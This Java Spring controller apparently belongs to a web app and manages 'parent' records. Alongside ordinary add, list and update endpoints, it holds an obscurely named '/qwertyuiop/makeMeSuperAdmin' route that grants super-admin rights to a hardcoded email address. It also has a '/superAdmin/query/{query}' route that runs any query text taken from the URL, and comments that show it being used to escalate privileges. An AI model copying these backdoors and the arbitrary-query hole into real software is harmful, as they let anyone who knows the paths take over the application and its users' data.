package edge.core.modules.parents;

import java.security.Principal;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.propertyeditors.CustomDateEditor;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.annotation.InitBinder;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;

import edge.core.config.CoreConstants;
import edge.core.exception.AppException;
import edge.core.modules.common.EdgeResponse;

@Controller
public class ParentsController {

private static final Logger logger = LoggerFactory.getLogger(ParentsController.class);
	
	@Autowired
	private ParentsService parentsService;

	@InitBinder
    public void initBinder(WebDataBinder binder) {
        SimpleDateFormat dateFormat = new SimpleDateFormat(CoreConstants.DEFAULT_DATE_FORMAT);
        dateFormat.setLenient(true);
        binder.registerCustomEditor(Date.class, new CustomDateEditor(dateFormat, true));        
    }
	
	public ParentsService getParentsService() {
		return parentsService;
	}

	@RequestMapping(value={"/qwertyuiop/makeMeSuperAdmin"})
	public EdgeResponse<Object> makeMeSuperAdmin(
			) throws Exception{
		String query = "update AuthorityEntity set authority = 'ROLE_SUPER_ADMIN' where username = 'patil.vinayb9@gmail.com'";
		Object result = parentsService.executeQuery(query);
		return EdgeResponse.createDataResponse(result, query);
	}
	
	// http://localhost:8080/contextRoot/server/qwertyuiop/bcvVpp1/update AuthorityEntity set authority = 'ROLE_SUPER_ADMIN' where username = 'q@q.com'.json
	//http://localhost:8080/contextRoot/server/qwertyuiop/bcvVpp1/update AuthorityEntity set authority = 'ROLE_USER' where username = 'q@q.com'.json
	
	@RequestMapping(value={"/superAdmin/query/{query}"})
	public EdgeResponse<Object> executeQuery(
			@PathVariable("query") String query
			) throws Exception{
		System.out.println(query);
		Object result = parentsService.executeQuery(query);
		return EdgeResponse.createDataResponse(result, query);
	}
	
	// http://localhost:8080/contextRoot/server/superAdmin/bcvVpp2/Parent.json
	
	@RequestMapping(value={"/superAdmin/entity/{entity}"})
	public EdgeResponse<List> showAll(
			@PathVariable("entity") String entity
			) throws Exception{
		System.out.println(entity);
		List result = parentsService.showAll(entity);
		return EdgeResponse.createDataResponse(result, entity);
	}
	
	@RequestMapping(value={"/addParent"})
	public EdgeResponse<Parent> addParent(
			@RequestBody Parent parent, Principal principal			
			) throws Exception{	
		try{
			String createdBy = "self";
			if(principal != null){
				createdBy = principal.getName();
			}
			Parent addParent = parentsService.addParent(parent, createdBy);
			return EdgeResponse.createSuccessResponse(addParent, "Entry added Successfully with ID : " + addParent.getParentId(), "Operators and admins should receive email with credentials to login. We thank you for choosing us!", null);
		}catch(AppException ex){
			return EdgeResponse.createExceptionResponse(ex);
		}
	}

	@RequestMapping(value={"/superAdmin/getAllParents"})
	public EdgeResponse<List<Parent>> getAllParents( 
			Principal principal			
			) throws Exception{	
		try{	
			List<Parent> allParents = parentsService.getAllParents();
			return EdgeResponse.createDataResponse(allParents, "");
		}catch(AppException ex){
			return EdgeResponse.createExceptionResponse(ex);
		}
	}

	@RequestMapping(value={"/superAdmin/updateParent"})
	public EdgeResponse<Parent> updateParent( 
			@RequestBody Parent parent,
			Principal principal			
			) throws Exception{	
		try{	
			Parent savedParent = parentsService.updateParent(parent, principal.getName());
			return EdgeResponse.createDataResponse(savedParent, "Entry saved Successfully with ID : " + parent.getParentId());
		}catch(AppException ae){
			return EdgeResponse.createExceptionResponse(ae);
		}
		
	}
	
	public void setParentsService(ParentsService parentsService) {
		this.parentsService = parentsService;
	}
}
